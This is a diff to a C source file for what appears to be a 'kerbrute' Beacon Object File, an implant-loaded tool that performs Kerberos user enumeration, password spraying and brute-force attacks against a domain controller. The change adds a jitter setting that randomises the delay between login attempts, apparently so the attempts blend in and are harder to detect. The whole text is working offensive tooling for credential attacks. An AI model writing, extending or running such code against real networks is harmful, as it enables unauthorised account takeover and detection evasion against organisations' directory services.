@@ -14,6 +14,7 @@
  *   [i] mode      — 0=userenum 1=passwordspray 2=bruteuser 3=bruteforce
  *   [i] delay     — ms between each attempt (0 = no delay)
  *   [i] flags     — bit0=downgrade bit1=safe bit2=verbose
+ *   [i] jitter    — ms of randomness added to each delay (0 = fixed delay)
  *
  * Build:
  *   x86_64-w64-mingw32-gcc -masm=intel -Wall -Wno-unused-variable \
@@ -110,7 +111,7 @@ static void fmt4(char *p, int v) {
 /* ── Shared context ──────────────────────────────────────────────────────── */
 typedef struct {
     const char *dc, *domain, *password, *username;
-    int   delay, downgrade, safe, verbose;
+    int   delay, jitter, downgrade, safe, verbose;
     int   valid, notfound, locked, errors;
     int   aborted, done;
 } krb_ctx;
@@ -895,7 +896,18 @@ static int handle_result(krb_ctx *ctx, int result,
                      stages[si], username, ctx->domain);
         break; }
     }
-    if (ctx->delay > 0) Sleep((DWORD)ctx->delay);
+    if (ctx->delay > 0 || ctx->jitter > 0) {
+        int sleep_ms = ctx->delay;
+        if (ctx->jitter > 0) {
+            /* Random offset in [-jitter, +jitter] via QPC low bits */
+            LARGE_INTEGER _q; KERNEL32$QueryPerformanceCounter(&_q);
+            int range = ctx->jitter * 2 + 1;
+            int offset = (int)(_q.LowPart % (unsigned)range) - ctx->jitter;
+            sleep_ms = ctx->delay + offset;
+            if (sleep_ms < 0) sleep_ms = 0;
+        }
+        Sleep((DWORD)sleep_ms);
+    }
     return ctx->aborted;
 }
 
@@ -961,6 +973,7 @@ void go(char *buffer, int length) {
     int   mode   = BeaconDataInt(&args);
     int   delay  = BeaconDataInt(&args);
     int   flags  = BeaconDataInt(&args);
+    int   jitter = BeaconDataInt(&args);
 
     if (!b64||!domain||Strlen(domain)==0) {
         BeaconPrintf(CALLBACK_ERROR,"[kerbrute] Missing required arguments.\n"); return;}
@@ -975,14 +988,15 @@ void go(char *buffer, int length) {
     ctx.password  = single;
     ctx.username  = single;
     ctx.delay     = delay;
+    ctx.jitter    = jitter;
     ctx.downgrade = (flags&FLAG_DOWNGRADE)!=0;
     ctx.safe      = (flags&FLAG_SAFE)!=0;
     ctx.verbose   = (flags&FLAG_VERBOSE)!=0;
 
     static const char *mnames[]={"userenum","passwordspray","bruteuser","bruteforce"};
     BeaconPrintf(CALLBACK_OUTPUT,
-        "[kerbrute] mode=%s  domain=%s  dc=%s  delay=%dms  aes=%s  downgrade=%s  safe=%s  verbose=%s\n",
-        (mode>=0&&mode<=3)?mnames[mode]:"?", domain, ctx.dc, delay,
+        "[kerbrute] mode=%s  domain=%s  dc=%s  delay=%dms  jitter=%dms  aes=%s  downgrade=%s  safe=%s  verbose=%s\n",
+        (mode>=0&&mode<=3)?mnames[mode]:"?", domain, ctx.dc, delay, ctx.jitter,
         ctx.downgrade?"no":"yes",
         ctx.downgrade?"yes":"no",
         ctx.safe?"yes":"no",
